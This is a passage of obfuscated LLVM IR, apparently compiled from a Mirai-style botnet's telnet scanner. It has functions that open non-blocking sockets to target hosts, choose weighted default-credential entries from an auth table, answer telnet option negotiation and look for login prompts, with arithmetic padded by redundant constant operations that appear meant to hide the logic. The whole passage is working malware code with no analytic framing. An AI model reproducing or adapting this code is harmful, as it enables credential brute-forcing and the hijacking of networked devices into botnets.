%111, %107, %103, %99, %95, %91, %87, %83, %79, %75, %71, %67, %63, %59, %55, %51
  %2344 = phi i1 [ true, %2335 ], [ true, %2327 ], [ true, %2319 ], [ true, %2307 ], [ true, %2299 ], [ true, %2291 ], [ true, %2283 ], [ true, %2271 ], [ true, %2259 ], [ true, %2247 ], [ true, %2235 ], [ true, %2223 ], [ true, %2211 ], [ true, %2195 ], [ true, %2179 ], [ true, %2163 ], [ true, %2151 ], [ true, %2143 ], [ true, %2131 ], [ true, %2119 ], [ true, %2107 ], [ true, %2095 ], [ true, %2083 ], [ true, %2071 ], [ true, %2059 ], [ true, %2047 ], [ true, %2031 ], [ true, %2015 ], [ true, %1999 ], [ true, %1983 ], [ true, %1967 ], [ true, %1951 ], [ true, %1935 ], [ true, %1919 ], [ true, %1903 ], [ true, %1887 ], [ true, %1871 ], [ true, %1855 ], [ true, %1839 ], [ true, %1823 ], [ true, %1807 ], [ true, %1791 ], [ true, %1775 ], [ true, %1759 ], [ true, %1751 ], [ true, %1743 ], [ true, %1735 ], [ true, %1727 ], [ true, %1719 ], [ true, %1711 ], [ true, %1703 ], [ true, %1695 ], [ true, %1687 ], [ true, %1679 ], [ true, %1671 ], [ true, %1663 ], [ true, %1655 ], [ true, %1647 ], [ true, %1639 ], [ true, %1631 ], [ true, %1623 ], [ true, %1607 ], [ true, %1591 ], [ true, %1575 ], [ true, %1559 ], [ true, %1543 ], [ true, %1527 ], [ true, %1511 ], [ true, %1495 ], [ true, %1479 ], [ true, %1463 ], [ true, %1447 ], [ true, %1431 ], [ true, %1423 ], [ true, %1415 ], [ true, %1399 ], [ true, %1383 ], [ true, %1367 ], [ true, %1351 ], [ true, %1335 ], [ true, %1319 ], [ true, %1303 ], [ true, %1287 ], [ true, %1271 ], [ true, %1255 ], [ true, %1239 ], [ true, %1223 ], [ true, %1207 ], [ true, %1191 ], [ true, %1175 ], [ true, %1159 ], [ true, %1143 ], [ true, %1127 ], [ true, %1111 ], [ true, %1095 ], [ true, %1079 ], [ true, %1071 ], [ true, %1063 ], [ true, %1055 ], [ true, %1047 ], [ true, %1039 ], [ true, %1031 ], [ true, %1023 ], [ true, %1015 ], [ true, %1007 ], [ true, %999 ], [ true, %991 ], [ true, %983 ], [ true, %971 ], [ true, %959 ], [ true, %947 ], [ true, %935 ], [ true, %923 ], [ true, %911 ], [ true, %899 ], [ true, %887 ], [ true, %875 ], [ true, %863 ], [ true, %851 ], [ true, %839 ], [ true, %827 ], [ true, %815 ], [ true, %803 ], [ true, %791 ], [ true, %779 ], [ true, %767 ], [ true, %755 ], [ true, %743 ], [ true, %731 ], [ true, %719 ], [ true, %707 ], [ true, %695 ], [ true, %683 ], [ true, %671 ], [ true, %659 ], [ true, %647 ], [ true, %635 ], [ true, %623 ], [ true, %611 ], [ true, %599 ], [ true, %587 ], [ true, %575 ], [ true, %563 ], [ true, %551 ], [ true, %539 ], [ true, %527 ], [ true, %515 ], [ true, %503 ], [ true, %491 ], [ true, %483 ], [ true, %471 ], [ true, %459 ], [ true, %451 ], [ true, %443 ], [ true, %435 ], [ true, %427 ], [ true, %419 ], [ true, %411 ], [ true, %403 ], [ true, %395 ], [ true, %387 ], [ true, %379 ], [ true, %371 ], [ true, %363 ], [ true, %355 ], [ true, %347 ], [ true, %339 ], [ true, %331 ], [ true, %323 ], [ true, %315 ], [ true, %307 ], [ true, %299 ], [ true, %291 ], [ true, %283 ], [ true, %275 ], [ true, %267 ], [ true, %259 ], [ true, %251 ], [ true, %243 ], [ true, %235 ], [ true, %227 ], [ true, %219 ], [ true, %211 ], [ true, %203 ], [ true, %195 ], [ true, %187 ], [ true, %179 ], [ true, %171 ], [ true, %163 ], [ true, %155 ], [ true, %147 ], [ true, %139 ], [ true, %135 ], [ true, %131 ], [ true, %127 ], [ true, %123 ], [ true, %119 ], [ true, %115 ], [ true, %111 ], [ true, %107 ], [ true, %103 ], [ true, %99 ], [ true, %95 ], [ true, %91 ], [ true, %87 ], [ true, %83 ], [ true, %79 ], [ true, %75 ], [ true, %71 ], [ true, %67 ], [ true, %63 ], [ true, %59 ], [ true, %55 ], [ true, %51 ], [ %2342, %2339 ]
  br i1 %2344, label %6, label %2345

; <label>:2345:                                   ; preds = %2343
  %2346 = load i8, i8* %2, align 1
  %2347 = zext i8 %2346 to i32
  %2348 = shl i32 %2347, 24
  %2349 = load i8, i8* %3, align 1
  %2350 = zext i8 %2349 to i32
  %2351 = shl i32 %2350, 16
  %2352 = xor i32 %2348, -1
  %2353 = xor i32 %2351, -1
  %2354 = xor i32 1892181686, -1
  %2355 = and i32 %2352, 1892181686
  %2356 = and i32 %2348, %2354
  %2357 = and i32 %2353, 1892181686
  %2358 = and i32 %2351, %2354
  %2359 = or i32 %2355, %2356
  %2360 = or i32 %2357, %2358
  %2361 = xor i32 %2359, %2360
  %2362 = or i32 %2352, %2353
  %2363 = xor i32 %2362, -1
  %2364 = or i32 1892181686, %2354
  %2365 = and i32 %2363, %2364
  %2366 = or i32 %2361, %2365
  %2367 = or i32 %2348, %2351
  %2368 = load i8, i8* %4, align 1
  %2369 = zext i8 %2368 to i32
  %2370 = shl i32 %2369, 8
  %2371 = and i32 %2366, %2370
  %2372 = xor i32 %2366, %2370
  %2373 = or i32 %2371, %2372
  %2374 = or i32 %2366, %2370
  %2375 = load i8, i8* %5, align 1
  %2376 = zext i8 %2375 to i32
  %2377 = shl i32 %2376, 0
  %2378 = and i32 %2373, %2377
  %2379 = xor i32 %2373, %2377
  %2380 = or i32 %2378, %2379
  %2381 = or i32 %2373, %2377
  %2382 = call i32 @htonl(i32 %2380) #7
  ret i32 %2382
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %62

; <label>:21:                                     ; preds = %15
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 6
  store i32 0, i32* %23, align 4
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = and i32 2048, %33
  %35 = xor i32 2048, %33
  %36 = or i32 %34, %35
  %37 = or i32 2048, %33
  %38 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %36)
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %39, align 4
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 4
  %42 = load i32, i32* %41, align 4
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %44 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %43, i32 0, i32 0
  store i32 %42, i32* %44, align 4
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 5
  %47 = load i16, i16* %46, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %47, i16* %48, align 2
  %49 = load i32, i32* @fake_time, align 4
  %50 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %51 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %50, i32 0, i32 2
  store i32 %49, i32* %51, align 4
  %52 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %53 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %52, i32 0, i32 3
  store i32 1, i32* %53, align 8
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 1
  %56 = load i32, i32* %55, align 8
  %57 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %58 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %58, %struct.sockaddr** %57, align 8
  %59 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %60 = load %struct.sockaddr*, %struct.sockaddr** %59, align 8
  %61 = call i32 @connect(i32 %56, %struct.sockaddr* %60, i32 16)
  br label %62

; <label>:62:                                     ; preds = %21, %20
  ret void
}

declare i32 @select(i32, %struct.fd_set.26*, %struct.fd_set.26*, %struct.fd_set.26*, %struct.timeval.27*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %50

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %13
  br label %43

; <label>:25:                                     ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %51

; <label>:41:                                     ; preds = %25
  br label %42

; <label>:42:                                     ; preds = %41
  br label %43

; <label>:43:                                     ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = sub i32 0, %44
  %46 = sub i32 0, 1
  %47 = add i32 %45, %46
  %48 = sub i32 0, %47
  %49 = add nsw i32 %44, 1
  store i32 %48, i32* %2, align 4
  br label %9

; <label>:50:                                     ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %51

; <label>:51:                                     ; preds = %50, %36
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %52
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %46

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %45

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = sub i32 %40, 1838681018
  %42 = add i32 %41, 1
  %43 = add i32 %42, 1838681018
  %44 = add nsw i32 %40, 1
  store i32 %43, i32* %10, align 4
  br label %21

; <label>:45:                                     ; preds = %21
  br label %46

; <label>:46:                                     ; preds = %45, %4
  %47 = load i32, i32* %9, align 4
  ret i32 %47
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %147, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %148

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %148

; <label>:23:                                     ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %146

; <label>:28:                                     ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* %29, i8* %30, i32 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

; <label>:33:                                     ; preds = %28
  br label %148

; <label>:34:                                     ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %48

; <label>:40:                                     ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = add i32 %43, 682509108
  %45 = add i32 %44, 2
  %46 = sub i32 %45, 682509108
  %47 = add nsw i32 %43, 2
  store i32 %46, i32* %3, align 4
  br label %11

; <label>:48:                                     ; preds = %34
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 253
  br i1 %53, label %54, label %87

; <label>:54:                                     ; preds = %48
  %55 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %56 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %56, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %58 = load i8*, i8** %4, align 8
  %59 = call signext i8 @can_consume(%struct.scanner_connection* %57, i8* %58, i32 2)
  %60 = icmp ne i8 %59, 0
  br i1 %60, label %62, label %61

; <label>:61:                                     ; preds = %54
  br label %148

; <label>:62:                                     ; preds = %54
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 2
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp ne i32 %66, 31
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %62
  br label %88

; <label>:69:                                     ; preds = %62
  %70 = load i8*, i8** %4, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 3
  store i8* %71, i8** %4, align 8
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 %72, 289742029
  %74 = add i32 %73, 3
  %75 = add i32 %74, 289742029
  %76 = add nsw i32 %72, 3
  store i32 %75, i32* %3, align 4
  %77 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %77, i32 0, i32 1
  %79 = load i32, i32* %78, align 8
  %80 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %81 = call i64 @send(i32 %79, i8* %80, i64 3, i32 16384)
  %82 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %83 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %82, i32 0, i32 1
  %84 = load i32, i32* %83, align 8
  %85 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %86 = call i64 @send(i32 %84, i8* %85, i64 9, i32 16384)
  br label %144

; <label>:87:                                     ; preds = %48
  br label %88

; <label>:88:                                     ; preds = %87, %68
  %89 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %90 = load i8*, i8** %4, align 8
  %91 = call signext i8 @can_consume(%struct.scanner_connection* %89, i8* %90, i32 2)
  %92 = icmp ne i8 %91, 0
  br i1 %92, label %94, label %93

; <label>:93:                                     ; preds = %88
  br label %148

; <label>:94:                                     ; preds = %88
  store i32 0, i32* %5, align 4
  br label %95

; <label>:95:                                     ; preds = %126, %94
  %96 = load i32, i32* %5, align 4
  %97 = icmp slt i32 %96, 3
  br i1 %97, label %98, label %131

; <label>:98:                                     ; preds = %95
  %99 = load i8*, i8** %4, align 8
  %100 = load i32, i32* %5, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 253
  br i1 %105, label %106, label %111

; <label>:106:                                    ; preds = %98
  %107 = load i8*, i8** %4, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  store i8 -4, i8* %110, align 1
  br label %125

; <label>:111:                                    ; preds = %98
  %112 = load i8*, i8** %4, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 251
  br i1 %118, label %119, label %124

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %4, align 8
  %121 = load i32, i32* %5, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  store i8 -3, i8* %123, align 1
  br label %124

; <label>:124:                                    ; preds = %119, %111
  br label %125

; <label>:125:                                    ; preds = %124, %106
  br label %126

; <label>:126:                                    ; preds = %125
  %127 = load i32, i32* %5, align 4
  %128 = sub i32 0, 1
  %129 = sub i32 %127, %128
  %130 = add nsw i32 %127, 1
  store i32 %129, i32* %5, align 4
  br label %95

; <label>:131:                                    ; preds = %95
  %132 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %132, i32 0, i32 1
  %134 = load i32, i32* %133, align 8
  %135 = load i8*, i8** %4, align 8
  %136 = call i64 @send(i32 %134, i8* %135, i64 3, i32 16384)
  %137 = load i8*, i8** %4, align 8
  %138 = getelementptr inbounds i8, i8* %137, i64 3
  store i8* %138, i8** %4, align 8
  %139 = load i32, i32* %3, align 4
  %140 = add i32 %139, 2042004231
  %141 = add i32 %140, 3
  %142 = sub i32 %141, 2042004231
  %143 = add nsw i32 %139, 3
  store i32 %142, i32* %3, align 4
  br label %144

; <label>:144:                                    ; preds = %131, %69
  br label %145

; <label>:145:                                    ; preds = %144
  br label %146

; <label>:146:                                    ; preds = %145, %23
  br label %147

; <label>:147:                                    ; preds = %146
  br label %11

; <label>:148:                                    ; preds = %93, %61, %33, %22, %11
  %149 = load i32, i32* %3, align 4
  ret i32 %149
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub i32 0, 1
  %15 = add i32 %13, %14
  %16 = sub nsw i32 %13, 1
  store i32 %15, i32* %5, align 4
  br label %17

; <label>:17:                                     ; preds = %72, %1
  %18 = load i32, i32* %5, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %78

; <label>:20:                                     ; preds = %17
  %21 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %21, i32 0, i32 7
  %23 = load i32, i32* %5, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i64 0, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = icmp eq i32 %27, 58
  br i1 %28, label %65, label %29

; <label>:29:                                     ; preds = %20
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 7
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [256 x i8], [256 x i8]* %31, i64 0, i64 %33
  %35 = load i8, i8* %34, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp eq i32 %36, 62
  br i1 %37, label %65, label %38

; <label>:38:                                     ; preds = %29
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 7
  %41 = load i32, i32* %5, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [256 x i8], [256 x i8]* %40, i64 0, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp eq i32 %45, 36
  br i1 %46, label %65, label %47

; <label>:47:                                     ; preds = %38
  %48 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %49 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %48, i32 0, i32 7
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [256 x i8], [256 x i8]* %49, i64 0, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp eq i32 %54, 35
  br i1 %55, label %65, label %56

; <label>:56:                                     ; preds = %47
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 7
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [256 x i8], [256 x i8]* %58, i64 0, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 37
  br i1 %64, label %65, label %71

; <label>:65:                                     ; preds = %56, %47, %38, %29, %20
  %66 = load i32, i32* %5, align 4
  %67 = add i32 %66, 852197277
  %68 = add i32 %67, 1
  %69 = sub i32 %68, 852197277
  %70 = add nsw i32 %66, 1
  store i32 %69, i32* %6, align 4
  br label %78

; <label>:71:                                     ; preds = %56
  br label %72

; <label>:72:                                     ; preds = %71
  %73 = load i32, i32* %5, align 4
  %74 = add i32 %73, 940526371
  %75 = add i32 %74, -1
  %76 = sub i32 %75, 940526371
  %77 = add nsw i32 %73, -1
  store i32 %76, i32* %5, align 4
  br label %17

; <label>:78:                                     ; preds = %65, %17
  %79 = load i32, i32* %6, align 4
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %120

; <label>:81:                                     ; preds = %78
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %82 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %82, i8** %9, align 8
  %83 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %83, i8** %10, align 8
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 7
  %86 = getelementptr inbounds [256 x i8], [256 x i8]* %85, i32 0, i32 0
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 6
  %89 = load i32, i32* %88, align 4
  %90 = load i8*, i8** %9, align 8
  %91 = load i32, i32* %8, align 4
  %92 = sub i32 0, 1
  %93 = add i32 %91, %92
  %94 = sub nsw i32 %91, 1
  %95 = call i32 @util_memsearch(i8* %86, i32 %89, i8* %90, i32 %93)
  %96 = icmp ne i32 %95, -1
  %97 = zext i1 %96 to i32
  store i32 %97, i32* %7, align 4
  br i1 %96, label %98, label %100

; <label>:98:                                     ; preds = %81
  %99 = load i32, i32* %7, align 4
  store i32 %99, i32* %6, align 4
